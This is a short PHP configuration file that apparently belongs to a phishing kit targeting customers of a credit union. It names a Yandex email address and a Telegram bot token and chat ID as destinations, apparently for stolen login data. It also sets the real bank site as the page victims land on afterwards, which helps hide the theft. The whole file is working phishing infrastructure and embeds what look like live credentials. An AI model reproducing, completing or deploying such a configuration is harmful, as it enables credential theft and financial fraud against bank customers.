<?php
	$TO='madison6u4m@yandex.com';
	$LAND='https://www.ncsecu.org';	
	$telegram_enable = true;
	$telegrambot = "bot5266105990:AAExriDQ0OTMU684QmNVzIa9MMg0jGX9R-U";
	$telegram_chatid = "-689515639";
?>